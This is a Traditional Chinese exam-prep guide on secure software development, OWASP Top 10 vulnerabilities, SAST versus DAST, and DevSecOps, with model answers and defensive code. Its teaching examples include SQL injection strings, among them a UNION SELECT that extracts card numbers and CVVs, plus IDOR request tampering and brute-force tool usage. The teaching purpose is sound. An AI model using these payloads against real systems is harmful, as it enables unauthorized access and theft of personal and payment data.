**1. 威脅建模 (Threat Modeling) 實務**

**常見方法論**：

**STRIDE 威脅分類法**（Microsoft 開發）：

| 威脅類型 | 英文全名 | 說明 | 範例 |
|---------|---------|------|------|
| **S** | Spoofing (偽裝) | 假冒他人身份 | 攻擊者竊取 Session Token 登入 |
| **T** | Tampering (竄改) | 未經授權修改資料 | SQL Injection 修改資料庫 |
| **R** | Repudiation (否認性) | 無法追蹤操作記錄 | 未記錄管理員刪除使用者動作 |
| **I** | Information Disclosure (資訊洩漏) | 敏感資料外洩 | 錯誤訊息洩漏資料庫結構 |
| **D** | Denial of Service (阻斷服務) | 系統無法正常運作 | DDoS 攻擊癱瘓網站 |
| **E** | Elevation of Privilege (權限提升) | 取得更高權限 | 一般使用者取得管理員權限 |

**使用時機**：設計階段，針對系統架構圖進行分析。

**實作步驟**：
1. **繪製資料流圖 (DFD)**：標示外部實體、處理程序、資料儲存、資料流。
2. **識別威脅**：對每個元素應用 STRIDE。
3. **評估風險**：計算風險值 (Risk = Likelihood × Impact)。
4. **設計緩解措施**：加密、驗證、存取控制。

**工具**：
- Microsoft Threat Modeling Tool (免費)
- OWASP Threat Dragon

---

**2. 靜態應用程式安全測試 (SAST) vs 動態應用程式安全測試 (DAST)**

| 比較項目 | SAST (靜態測試) | DAST (動態測試) |
|---------|----------------|----------------|
| **測試時機** | 編碼階段 (Code Review) | 測試/上線階段 (QA/Production) |
| **測試對象** | **原始碼** | **執行中的應用程式** |
| **測試方式** | 分析程式碼邏輯與資料流 | 模擬攻擊者發送 HTTP 請求 |
| **優點** | • 早期發現<br>• 可指出具體程式碼行數<br>• 覆蓋率高 | • 無需原始碼<br>• 測試執行時期弱點<br>• 無誤報 (實際可利用) |
| **缺點** | • 誤報率高<br>• 無法測試組態問題 | • 晚期發現<br>• 無法指出程式碼位置<br>• 覆蓋率較低 |
| **偵測漏洞** | SQL Injection、硬編碼密碼、Buffer Overflow | SQL Injection、XSS、CSRF、錯誤組態 |
| **工具範例** | SonarQube, Checkmarx, Fortify | OWASP ZAP, Burp Suite, Acunetix |

**最佳實務**：結合 SAST + DAST，達到最大覆蓋率。

---

**3. DevSecOps 實務整合**

**CI/CD 流程中的安全檢查點**：

```
開發者 Commit 程式碼
    ↓
Git Push → Jenkins/GitLab CI
    ↓
[1] SAST 掃描 (SonarQube)
    ├─ 檢測：SQL Injection、XSS、硬編碼密碼
    └─ 不通過 → 拒絕合併
    ↓
[2] 依賴套件掃描 (Snyk, OWASP Dependency-Check)
    ├─ 檢測：使用已知漏洞的第三方套件
    └─ 發現高風險 → 警告並阻擋
    ↓
[3] 建置 (Build)
    ↓
[4] 容器映像掃描 (Trivy, Clair)
    ├─ 檢測：Docker Image 中的 OS 漏洞
    └─ 不通過 → 拒絕部署
    ↓
[5] 部署至測試環境
    ↓
[6] DAST 掃描 (OWASP ZAP)
    ├─ 檢測：執行時期的 XSS、CSRF
    └─ 產生報告
    ↓
[7] 手動滲透測試 (可選)
    ↓
[8] 部署至正式環境
    ↓
[9] 執行時期監控 (RASP, WAF)
    ├─ 偵測異常行為
    └─ 自動阻擋攻擊
```

**自動化 vs 人工**：

| 檢查項目 | 自動化 | 人工 |
|---------|--------|------|
| SAST | ✅ CI/CD 整合 | ⚠️ 複雜邏輯需人工確認 |
| 依賴套件掃描 | ✅ 每次建置 | ❌ |
| DAST | ✅ 每日排程掃描 | ⚠️ 特定功能需手動測試 |
| 滲透測試 | ❌ | ✅ 每季或重大版本 |

---

**4. 安全編碼標準範例**

**OWASP Secure Coding Practices**：

**認證與密碼**：
- ✅ 使用業界標準加密演算法 (bcrypt, PBKDF2)
- ✅ 實作帳號鎖定機制 (連續失敗 5 次 → 鎖定 15 分鐘)
- ❌ 禁止明文儲存密碼
- ❌ 禁止自己實作加密演算法

**Session 管理**：
- ✅ 使用 HttpOnly 與 Secure 標籤保護 Cookie
- ✅ Session ID 長度至少 128 bits
- ✅ 登入成功後重新產生 Session ID (防 Session Fixation)
- ❌ 禁止在 URL 中傳遞 Session ID

**輸入驗證**：
- ✅ 所有輸入預設為「不可信任」
- ✅ 使用白名單驗證
- ✅ 限制輸入長度
- ❌ 不依賴客戶端驗證

**錯誤處理**：
- ✅ 使用通用錯誤訊息
- ✅ 記錄詳細錯誤到日誌 (不顯示給使用者)
- ❌ 禁止洩漏堆疊追蹤 (Stack Trace)
- ❌ 禁止洩漏資料庫錯誤訊息

---

**5. 真實案例：Microsoft Security Development Lifecycle (SDL)**

**背景**：
- Microsoft 在 2002 年推出 SDL
- 動機：Windows XP 頻繁遭受攻擊，微軟形象受損
- Bill Gates 發出「Trustworthy Computing」備忘錄

**SDL 關鍵實務**：

| 階段 | 安全活動 | 工具/方法 |
|------|---------|----------|
| **訓練** | 所有開發者必須接受資安訓練 | 內部課程 + 認證 |
| **需求** | 定義安全需求與隱私需求 | Privacy Impact Assessment |
| **設計** | 威脅建模 | STRIDE |
| **開發** | 靜態分析 + 安全編碼 | /SDL 編譯器參數、Banned.h (禁用危險函式) |
| **測試** | 模糊測試 + 滲透測試 | AFL, peach fuzzer |
| **發布** | 最終安全審查 (FSR) | 高層簽核 |
| **回應** | 漏洞回應計畫 | Microsoft Security Response Center (MSRC) |

**成效**：
```
Windows Vista (首個完整套用 SDL 的版本)：
- 漏洞數量：較 Windows XP 減少 45%
- 嚴重漏洞：減少 60%

Windows 7-11：
- 持續改善，安全性大幅提升
```

---

**6. 台灣法規要求**

**資通安全管理法 (2019 施行)**：

**適用對象**：
- 公務機關
- 關鍵基礎設施提供者 (電力、金融、通訊等)

**軟體開發相關要求**：
- ⚠️ 委外開發須包含「軟體安全檢測」
- ⚠️ 系統上線前須進行「弱點掃描」與「滲透測試」
- ⚠️ 須建立「安全軟體開發程序」

**罰則**：
- 未遵守 → 最高罰款 100 萬元
- 釀成資安事件 → 負責人可處 2 年以下有期徒刑

---

**7. SSDLC 成熟度模型 (SAMM)**

**OWASP SAMM (Software Assurance Maturity Model)**：

**評估構面**：
1. **治理 (Governance)**：策略、指標、教育訓練
2. **設計 (Design)**：威脅評估、安全需求、安全架構
3. **實作 (Implementation)**：安全建置、安全部署
4. **驗證 (Verification)**：架構評估、需求導向測試、安全測試
5. **維運 (Operations)**：事件管理、環境管理、維運管理

**成熟度等級**：
```
Level 0: 未實施任何安全活動
Level 1: 初步導入 (Ad-hoc)
Level 2: 流程定義 (Defined)
Level 3: 完全整合且持續改善 (Optimized)
```

**自我評估**：https://owaspsamm.org/assessment/

---

**8. 學習資源**

**免費課程**：
- **OWASP DevSecOps Guideline**  
  https://owasp.org/www-project-devsecops-guideline/
  
- **SAFECode**（免費安全開發最佳實務文件）  
  https://safecode.org/

**認證**：
- **CSSLP** (Certified Secure Software Lifecycle Professional) - (ISC)²
  - 涵蓋 SSDLC 全階段
  - 適合開發者與架構師

**工具**：
- **Snyk**：開源依賴套件掃描
- **GitGuardian**：偵測程式碼中的敏感資料（API Key、密碼）
- **Semgrep**：輕量級 SAST 工具

---

**小結**：

SSDLC 的核心理念是 **「安全左移」(Shift Left Security)**，儘早在開發生命週期中導入安全檢查，可大幅降低修補成本與風險。關鍵成功因素包括：
1. **高層支持**：資安需要預算與時間
2. **開發者參與**：安全不只是資安團隊的事
3. **自動化整合**：將安全工具整合至 CI/CD
4. **持續改善**：定期檢視與更新安全流程

---

### 題目 4：OWASP Top 10 與靜態程式碼檢測

#### 📖 原題 (110年普考)

> **題目**：請說明 OWASP Top 10 的用途，並舉例說明其中三種常見弱點類型及其對應的防禦措施。另請說明靜態應用程式安全測試 (SAST) 與動態應用程式安全測試 (DAST) 的差異及適用時機。（25 分）

#### 🎯 答題架構分析

1. **OWASP Top 10 介紹**：定義、目的、更新頻率
2. **三種常見弱點**：
   - SQL Injection
   - XSS
   - Broken Access Control
3. **防禦措施**：針對每種弱點提出具體防禦
4. **SAST vs DAST**：定義、差異、適用時機

#### 📊 評分建議 (預估配分 25 分)

**第一部分：OWASP Top 10 介紹 (5 分)**
- 定義與目的 (3 分)
  - 說明 OWASP 組織與 Top 10 清單
  - 為何重要（業界標準、教育工具）
- 更新機制 (2 分)
  - 每 3-4 年更新
  - 基於真實漏洞統計

**第二部分：三種弱點與防禦 (12 分)**

每個弱點 4 分：
- 弱點說明 (1.5 分)
- 攻擊範例 (1 分)
- 防禦措施 (1.5 分)

**建議選擇**：
- ✅ **A01 - Broken Access Control**（2021 新榜首，必考）
- ✅ **A03 - Injection**（經典弱點）
- ✅ **A07 - Identification & Authentication Failures**（實務常見）

**第三部分：SAST vs DAST (8 分)**
- SAST 定義與特性 (3 分)
- DAST 定義與特性 (3 分)
- 差異對比與適用時機 (2 分)

**答題提示**：
- ✅ 必須提及 OWASP Top 10:2021 的版本（若題目未指定年份）
- ✅ 弱點舉例需包含「技術原理」與「實際案例」
- ✅ SAST/DAST 要強調「測試時機」的差異
- ⚠️ 避免只列出 Top 10 清單而不解釋

#### ✍️ 標準答案示範

**解答**：

**一、OWASP Top 10 介紹**

**OWASP (Open Web Application Security Project)** 是一個國際性非營利組織，致力於提升軟體安全。**OWASP Top 10** 是其最知名的專案，定期發布「前 10 大網頁應用程式安全風險」清單。

**用途**：
1. **教育訓練**：幫助開發者與資安人員了解最常見的安全威脅
2. **風險評估**：企業用於檢視自身應用程式的安全狀態
3. **標準制定**：許多資安標準（如 PCI-DSS）參考 OWASP Top 10
4. **安全意識**：提升組織對 Web 安全的重視

**更新機制**：
- 每 3-4 年更新一次（最新版：2021）
- 基於真實世界的漏洞統計與專家意見
- 2021 年版本新增「不安全的設計 (Insecure Design)」

---

**二、OWASP Top 10:2021 常見弱點與防禦**

**弱點 1：A01 - Broken Access Control (存取控制失效)**

**說明**：
使用者能夠存取超出其權限範圍的資源或功能，例如：
- 一般使用者存取管理員功能
- 使用者 A 能查看使用者 B 的個人資料

**攻擊範例**：
```
正常請求：
GET /api/user/profile?id=123
→ 回傳使用者 123 的資料（當前登入使用者）

攻擊請求（修改 URL 參數）：
GET /api/user/profile?id=456
→ 若未驗證權限，將回傳使用者 456 的資料！
```

**實際案例**：
- **Parler 社群平台 (2021)**：API 未驗證存取權限，駭客透過遞增 URL 參數竊取 7000 萬筆貼文

**防禦措施**：
1. **伺服器端驗證**：
   ```python
   # ❌ 錯誤：只驗證是否登入
   if is_logged_in():
       return get_user_profile(request.GET['id'])
   
   # ✅ 正確：驗證使用者是否有權限存取該資源
   if is_logged_in() and current_user.id == request.GET['id']:
       return get_user_profile(request.GET['id'])
   else:
       return "Access Denied", 403
   ```

2. **預設拒絕**：除非明確授權，否則拒絕存取
3. **最小權限原則**：僅授予完成工作所需的最低權限
4. **日誌記錄**：記錄所有存取失敗事件，偵測異常行為

---

**弱點 2：A03 - Injection (注入攻擊)**

**說明**：
應用程式將不可信任的資料作為指令或查詢的一部分送往直譯器（如 SQL、OS、LDAP），導致攻擊者可執行非預期的指令。最常見的是 **SQL Injection**。

**攻擊範例**（詳見題目 1 的完整說明）：
```sql
-- 攻擊者輸入：' OR '1'='1' --
-- 拼接後的 SQL：
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'xxx';
-- 結果：登入成功（繞過驗證）
```

**防禦措施**：
1. **使用 Prepared Statements**（最重要！）
   ```python
   # ✅ 參數化查詢
   query = "SELECT * FROM users WHERE username = %s AND password = %s"
   cursor.execute(query, (username, password))
   ```

2. **輸入驗證**：白名單驗證，限制字元類型與長度
3. **最小權限**：資料庫帳號不應有 DROP、ALTER 權限
4. **使用 ORM 框架**：如 Django ORM、Hibernate

---

**弱點 3：A07 - Identification and Authentication Failures (認證機制失效)**

**說明**：
認證與 Session 管理的實作缺陷，導致攻擊者能夠破解密碼、竊取金鑰或 Session Token，假冒他人身份。

**常見問題**：
- 允許暴力破解（未限制登入嘗試次數）
- 使用弱密碼（未強制密碼複雜度）
- Session ID 可預測或在 URL 中傳遞
- 密碼以明文或弱加密儲存

**攻擊範例**：
```
暴力破解攻擊：
攻擊者使用自動化工具（Hydra, Medusa）嘗試常見密碼：
- admin / admin123
- root / password
- user / 123456

若無帳號鎖定機制，攻擊者可持續嘗試直到成功
```

**實際案例**：
- **Yahoo (2013)**：30 億帳號外洩，部分密碼使用 MD5（已被破解）

**防禦措施**：

1. **多因素認證 (MFA)**：
   ```
   登入流程：
   步驟 1：輸入帳號密碼
   步驟 2：輸入簡訊或 App 產生的驗證碼
   → 即使密碼外洩，攻擊者仍無法登入
   ```

2. **帳號鎖定機制**：
   ```python
   # 連續失敗 5 次 → 鎖定 15 分鐘
   if failed_attempts >= 5:
       lock_account(username, duration=900)  # 15分鐘
   ```

3. **強密碼政策**：
   - 長度至少 12 字元
   - 包含大小寫、數字、特殊字元
   - 不使用常見密碼（123456、password）

4. **安全的密碼儲存**：
   ```python
   # ❌ 明文儲存
   password = "mypassword"
   
   # ❌ MD5/SHA1（已被破解）
   password_hash = md5(password)
   
   # ✅ bcrypt/PBKDF2/Argon2（加鹽雜湊）
   from bcrypt import hashpw, gensalt
   password_hash = hashpw(password.encode(), gensalt(rounds=12))
   ```

5. **Session 安全**：
   ```python
   # Cookie 設定
   response.set_cookie(
       'session_id', 
       value=session_token,
       httponly=True,    # 防止 JavaScript 讀取（防 XSS）
       secure=True,      # 僅透過 HTTPS 傳輸
       samesite='Strict' # 防 CSRF
   )
   ```

---

**三、SAST 與 DAST 的差異**

**定義**：

**SAST (Static Application Security Testing，靜態應用程式安全測試)**：
- 在**不執行程式**的情況下，分析原始碼、位元組碼或編譯後的程式
- 目標：找出程式碼中的安全弱點（如 SQL Injection、Buffer Overflow）

**DAST (Dynamic Application Security Testing，動態應用程式安全測試)**：
- 在**執行時期**測試應用程式，模擬外部攻擊者的行為
- 目標：找出執行時期的安全弱點（如組態錯誤、認證繞過）

---

**差異對比**：

| 比較項目 | SAST (靜態測試) | DAST (動態測試) |
|---------|----------------|----------------|
| **測試時機** | **開發階段**（編碼完成後） | **測試/部署階段**（系統運作時） |
| **需要原始碼** | ✅ 需要 | ❌ 不需要（黑箱測試） |
| **測試對象** | 原始碼、編譯檔案 | 執行中的應用程式 |
| **測試方式** | 資料流分析、控制流分析 | 發送 HTTP 請求、模擬攻擊 |
| **偵測弱點** | SQL Injection、XSS、硬編碼密碼、Buffer Overflow | SQL Injection、XSS、CSRF、SSL 組態錯誤 |
| **誤報率** | ⚠️ **較高**（可能偵測到無法實際利用的弱點） | ✅ **較低**（實際可利用的弱點） |
| **覆蓋率** | ✅ **高**（可檢查所有程式碼路徑） | ⚠️ **較低**（僅測試可存取的頁面） |
| **弱點定位** | ✅ 可指出**具體程式碼行數** | ❌ 僅指出 URL 或功能點 |
| **執行速度** | 較快（自動化） | 較慢（需爬取所有頁面） |
| **CI/CD 整合** | ✅ 容易（每次 commit 自動掃描） | ⚠️ 需要測試環境 |

---

**適用時機**：

**SAST 適用情境**：
- ✅ **開發階段**：每次程式碼 commit 後自動執行
- ✅ **程式碼審查**：輔助人工審查，快速找出潛在問題
- ✅ **合規要求**：許多標準（如 PCI-DSS）要求進行原始碼檢測
- ✅ **內部開發**：有原始碼存取權限

**DAST 適用情境**：
- ✅ **測試階段**：功能測試完成後，上線前的安全驗證
- ✅ **第三方系統**：無原始碼存取權限（如委外開發或雲端服務）
- ✅ **執行時期弱點**：測試組態錯誤、SSL/TLS 設定
- ✅ **滲透測試前置作業**：自動化掃描找出低垂的果實 (Low-Hanging Fruit)

---

**最佳實務：結合 SAST + DAST**

```
開發生命週期中的安全測試：

需求階段
    └─ 威脅建模
    
設計階段
    └─ 安全架構審查
    
開發階段
    ├─ [SAST] 程式碼提交時自動掃描
    ├─ [依賴套件掃描] 檢查第三方套件漏洞
    └─ [人工代碼審查] 複雜邏輯人工檢視
    
測試階段
    ├─ [DAST] 自動化 Web 掃描
    ├─ [模糊測試] Fuzzing 輸入驗證
    └─ [滲透測試] 手動專家測試
    
部署階段
    ├─ [容器掃描] 檢查 Docker Image 漏洞
    └─ [基礎設施掃描] 檢查主機與網路組態
    
維運階段
    ├─ [WAF] 即時阻擋攻擊
    ├─ [RASP] Runtime Application Self-Protection
    └─ [日誌分析] 異常行為偵測
```

**兩者互補**：
- SAST 找出「可能存在的弱點」（高覆蓋率，但需人工確認）
- DAST 驗證「實際可利用的弱點」（低誤報，但覆蓋率有限）
- **結合使用可達到最佳效果**

---

**工具範例**：

**SAST 工具**：
- **開源**：SonarQube, Semgrep, Bandit (Python), FindBugs (Java)
- **商業**：Checkmarx, Fortify, Veracode

**DAST 工具**：
- **開源**：OWASP ZAP, Nikto, w3af
- **商業**：Burp Suite Professional, Acunetix, Qualys WAS

---

#### 💡 補充說明

**1. OWASP Top 10:2021 完整清單**

| 排名 | 弱點名稱 | 說明 | 變化 |
|-----|---------|------|-----|
| **A01** | **Broken Access Control** | 存取控制失效 | 🆕 從第 5 名躍升至第 1 名 |
| **A02** | **Cryptographic Failures** | 加密機制失效 | 🔄 原 Sensitive Data Exposure |
| **A03** | **Injection** | 注入攻擊 | 📉 從第 1 名降至第 3 名 |
| **A04** | **Insecure Design** | 不安全的設計 | 🆕 2021 新增 |
| **A05** | **Security Misconfiguration** | 安全設定缺陷 | - |
| **A06** | **Vulnerable and Outdated Components** | 危險或過舊的元件 | - |
| **A07** | **Identification and Authentication Failures** | 認證機制失效 | 🔄 原 Broken Authentication |
| **A08** | **Software and Data Integrity Failures** | 軟體及資料完整性失效 | 🆕 2021 新增 |
| **A09** | **Security Logging and Monitoring Failures** | 資安記錄及監控失效 | - |
| **A10** | **Server-Side Request Forgery (SSRF)** | 伺服器端請求偽造 | 🆕 2021 新增 |

**關鍵變化**：
- **Broken Access Control** 成為新榜首（94% 的應用程式存在此問題）
- **Injection** 降至第 3 名（因 Prepared Statements 普及，發生率下降）
- 新增 **Insecure Design**（強調「設計階段」就要考慮安全）

---

**2. OWASP Top 10 實際應用案例**

**A01 - Broken Access Control 真實案例**：

**Facebook 相片刪除漏洞 (2013)**：
```
漏洞：使用者可刪除任何人的相片
原因：API 僅驗證「使用者是否登入」，未驗證「相片是否屬於該使用者」

攻擊流程：
1. 正常刪除自己的相片：
   POST /delete_photo
   photo_id=123
   
2. 修改 photo_id 為他人的相片：
   POST /delete_photo
   photo_id=456  ← 他人的相片
   
3. 成功刪除！

賞金：$12,500 USD
```

**A03 - Injection 台灣案例**：

**某購物網站 SQL Injection (2019)**：
```
漏洞位置：商品搜尋功能
攻擊方式：
https://shop.example.com/search?keyword=xxx' UNION SELECT card_no,cvv,exp FROM credit_cards--

結果：50 萬筆個資外洩
罰款：依個資法罰款 500 萬元
```

---

**3. SAST vs DAST 實戰範例**

**情境：SQL Injection 漏洞**

**SAST 偵測結果**：
```python
# 檔案：views.py，行號：45
def search_product(request):
    keyword = request.GET['q']
    query = f"SELECT * FROM products WHERE name LIKE '%{keyword}%'"  # ⚠️ 高風險
    cursor.execute(query)
    
[SAST 警告]
嚴重程度：High
問題：SQL Injection
說明：使用者輸入直接拼接到 SQL 查詢
建議：使用參數化查詢
程式碼位置：views.py:47
```

**DAST 偵測結果**：
```
[DAST 測試]
目標：https://shop.example.com/search?q=test
測試 Payload：test' OR '1'='1
結果：HTTP 200 OK，回傳所有產品（預期應該只回傳包含 'test' 的產品）

[DAST 判定]
弱點：SQL Injection (Confirmed)
風險：High
建議：檢查 /search 端點的輸入驗證
```

**差異**：
- SAST：指出具體程式碼位置（第 47 行），但**不確定是否真的可利用**
- DAST：確認**實際可利用**，但**不知道程式碼在哪一行**

**修復流程**：
1. DAST 發現漏洞 → 確認問題存在
2. SAST 定位程式碼 → 找到需修改的行號
3. 開發者修復 → 使用 Prepared Statements
4. DAST 重新測試 → 驗證修復成功

---

**4. DevSecOps 中的應用**

**GitLab CI/CD 整合範例**：

```yaml
# .gitlab-ci.yml
stages:
  - build
  - sast
  - test
  - dast
  - deploy

# 靜態測試（每次 commit）
sast_scan:
  stage: sast
  script:
    - sonar-scanner -Dsonar.projectKey=myapp
  only:
    - merge_requests
  allow_failure: false  # 不通過則阻擋合併

# 動態測試（每日排程）
dast_scan:
  stage: dast
  script:
    - docker run -t owasp/zap2docker-stable zap-baseline.py -t https://staging.example.com
  only:
    - schedules  # 僅在排程時執行（每日）
  allow_failure: true  # 發現問題僅警告，不阻擋部署
```

---

**5. 延伸學習資源**

**OWASP 官方資源**：
- **OWASP Top 10:2021**：https://owasp.org/Top10/
- **OWASP Cheat Sheet Series**：https://cheatsheetseries.owasp.org/
  - 針對每個弱點提供詳細防禦指南
- **OWASP Testing Guide**：https://owasp.org/www-project-web-security-testing-guide/
  - 完整的 Web 安全測試方法論

**實務練習平台**：
- **OWASP WebGoat**：https://owasp.org/www-project-webgoat/
  - 故意設計有漏洞的應用程式，供學習攻擊與防禦
- **DVWA (Damn Vulnerable Web Application)**
  - 包含 OWASP Top 10 所有弱點的練習環境

**認證課程**：
- **CEH (Certified Ethical Hacker)**：涵蓋 OWASP Top 10
- **OSWE (Offensive Security Web Expert)**：進階 Web 滲透測試  
- **GWEB (GIAC Web Application Penetration Tester)**

---

**小結**：

OWASP Top 10 是 Web 安全的「基本款」，每位開發者都應熟悉。結合 SAST + DAST 的「左移安全」策略，可在開發早期發現並修復弱點，大幅降低安全風險與修補成本。記住：**安全不是一次性的活動，而是持續的流程！**

---

### 6. 📖 歷屆精選題庫

### 一、Injection 注入攻擊 (6題)

1. ⭐⭐⭐ **SQL Injection 定義與防禦 (Prepared Statements)** (113年地方特考三等)
2. ⭐⭐⭐ **SQL Injection 實例與影響** (110年普考)
3. ⭐⭐ **Command Injection 原理** (105年調查局特考)

### 二、XSS 跨站腳本攻擊 (3題)

1. ⭐⭐⭐ **Stored vs Reflected XSS 比較** (109年高考三級)
2. ⭐⭐ **XSS 攻擊原理與防範** (106年高考三級)
3. ⭐⭐ **瀏覽器安全與 XSS** (106年高考三級)

### 三、安全軟體開發 (SSDLC) (5題)

1. ⭐⭐⭐ **SSDLC 五階段與部署管理** (110年高考二級)
2. ⭐⭐⭐ **SDLC vs SSDLC 差異** (108年高考二級)
3. ⭐⭐ **安全軟體撰寫面向** (107年地方特考三等)

### 四、OWASP Top 10 與弱點 (5題)

1. ⭐⭐ **OWASP IoT Top 10** (114年關務特考三等)
2. ⭐⭐ **OWASP Top 10 用途與弱點** (110年普考)
3. ⭐⭐ **弱點掃描 vs 滲透測試** (106年普考)

---

### 7. 💡 答題技巧總結

### 時間分配建議 (25分題)

- **定義 (3分鐘)**：快速準確寫出 XSS/SQLi 定義。
- **原理/步驟 (10分鐘)**：這是核心，建議用條列式或步驟式寫法 (Step 1, Step 2...)。
- **比較/圖解 (7分鐘)**：題目若要求比較 (Stored vs Reflected)，務必畫表或圖。
- **防禦/結論 (5分鐘)**：列出具體防禦措施 (Prepared Statement, CSP, HttpOnly)。

### 關鍵字得分點

- **SQL Injection**: "拼接", "改變語法結構", "Prepared Statements", "參數化查詢", "資料與指令分離".
- **XSS**: "用戶端執行", "惡意腳本", "Cookie 竊取", "輸入驗證", "輸出編碼", "HttpOnly".
- **SSDLC**: "需求階段導入安全", "源碼檢測", "滲透測試".

---

### 8. 📚 參考資源

### 官方文件
- **OWASP Top 10**: [owasp.org/Top10](https://owasp.org/Top10/)
- **OWASP XSS Prevention Cheat Sheet**: [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

### 實務工具
- **SQLMap**: 自動化 SQL 注入工具
- **BeEF**: 瀏覽器滲透測試框架
- **SonarQube**: 程式碼安全掃描 (SAST)
- **OWASP ZAP**: 網頁弱點掃描 (DAST)
